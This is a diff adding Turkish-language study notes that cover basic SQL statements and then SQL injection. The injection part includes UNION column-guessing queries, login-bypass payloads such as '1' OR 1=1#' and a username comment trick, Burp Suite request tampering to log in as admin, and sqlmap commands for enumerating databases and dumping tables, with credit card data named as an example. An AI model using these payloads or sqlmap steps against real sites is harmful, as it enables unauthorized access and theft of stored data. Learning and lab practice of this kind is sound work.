@@ -1,0 +1,116 @@
+--VERİ EKLEME
+
+<CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER);
+
+<INSERT INTO test (name,age) VALUES ('Yigit',22);
+
+
+<INSERT INTO test (name,age) VALUES ('James',60);
+<SELECT * FROM test;
+
+--FİLTRELEMELER
+
+
+<SELECT * FROM test WHERE id=3;  // id si 3 olanları bana getir
+
+<SELECT * FROM test WHERE name LIKE 'E%'; // E harfı ile başlayanları getir.
+
+<  ' % ' önce yüzde harfini sonra harfi belirtirsen sonu o harf ile bitenleri getirir.
+
+-----EKLEYİP SİLMEK
+
+
+<UPDATE test SET age = 33 WHERE id=1; //// id si 1 olanın yaşını 33 yaptık bunu ismi belirterek de name=('Yigit') ile de ismi vererek de yapabiliriz
+
+<DELETE FROM test WHERE id=4;  //// id si 4 olanı sildik
+
+
+-------QUERY
+
+<SELECT * FROM demo UNION SELECT * FROM test;  /// UNİON SELECT ile farklı tablolardan 2 farklı istek yapabildik ikisini de bize verdi
+
+---- SÜTÜN TAHMİN ETMEK
+<SELECT * FROM test2 UNION SELECT 1, 2, 3, 4 FROM test; //// SÜTÜN SAYILARINI TAHMİN ETMEYE ÇALIŞTIK
+
+<SELECT * FROM test2 UNION SELECT id, 2, 3, name FROM test;
+
+
+-------SQL AÇIKLARI BULMAK
+
+*** enjeksiyon olup olmadıgını anlamanın en basit yolu login yerine ' tek tırnak koymak
+*** ' tek tırnak koydugumuzda web sitesinin yaptıgı sorgu = SELECT * FROM accounts WHERE username='yigit' AND password='''
+
+<SELECT * FROM accounts WHERE username='yigit' AND password='123456' AND 1=1#'
+
+<123456' AND 1=1#  //// şifremiz 123456 oldugunu biliyoruz bu şekilde sql koduyla girerek sql açıgı oldugunu anladık 
+<123456' AND 1=1-- //// her zaman hash işareti çalışmayabilir bazı sitelerde 2 tane "--" işaretiyle denemelisin
+
+******* username kısmına 
+<yigit'# yazdık bu 
+<SELECT * FROM accounts WHERE username='yigit'#'AND password='1' //// bunu çalıştırır yani adı yigit olanı getir diyor hash işareti oldugu için -
+password kısmını almıyor sadece username kısmını çalıştırıyor
+
+*******şifre kısmına
+<1' OR 1=1# yazarak
+<123456' ORDER BY 1#
+
+<SELECT * FROM accounts WHERE username='yigit' 'AND password='1' OR 1=1'#' sorgusunu çalıştırırız yani 
+////// bir bire eşitse yani username ya da password herhangi biri doğruysa diğerini kontrol etmicek 
+ *** OR komutu genelde ilk kullanıcıyla giriş yapar ilk kullanıcı genelde admin olur o yüzden çok kullanmamak iyidir
+
+-----------GÜVENLİ SUNUCUDA SQL AÇIGI BULMAK
+
+-denediğimiz sql kodları çalışmadı
+-burpsuite intercept açıp denedik gene burpsuiteye bir şey gelmedi
+-acaba web sitesinde hiç istek yollamıyor mu onu öğrenicez
+
+-burpsuite den normal intercept alıp
+-kullanıcı adı şifre kısmını burpsuiteden değiştirdik
+-kullanıcı adı aynı
+-şifreye 1' OR 1=1# yazarak gene adminn olarak giriş yaptık
+
+------SQL KOD ÖRNEKLERİ
+SELECT * FROM demo;
+INSERT INTO demo (id,name,hint)VALUES (26,"james","guitar");
+
+DELETE FROM demo WHERE name = "james" 
+
+INSERT INTO demo (id, name, hint) VALUES (26, "ELLİOT", "TESTLAN");
+
+UPDATE demo SET id = 26 WHERE name = "ELLİOT";
+
+-------SQL KODLARI
+* / HERŞEYİ
+EKLEME
+INSERT INTO demo (id,name,hint)VALUES (26,"james","guitar");
+ 
+silmek
+DELETE FROM demo WHERE name = "james" 
+
+GÜNCELLEMEK 
+UPDATE demo SET id = 18 WHERE name = "Atil";
+
+FİLTRELEME
+<SELECT * FROM demo WHERE id = admin;
+
+<SELECT * FROM demo WHERE name LİKE "A%"; / a ile başlayanları göster
+
+<SELECT * FROM demo WHERE name LİKE "%A"; / a ile bitenleri göster
+
+--------SQLMAP 
+sqlmap link / açıkları arar
+sqlmap link --dbs / dbs = data basesi
+sqlmap link --current-db / güncel data basesi
+sqlmap link --columns -T (credit kart )/ -T = belli olan dosyaya girmek
+sqlmap link -T 
+<-D owasp10 / veri tabanını gösterme
+<--dump / tüm datayı getir
+
+sqlmap --help
+
+
+
+
+
+
+
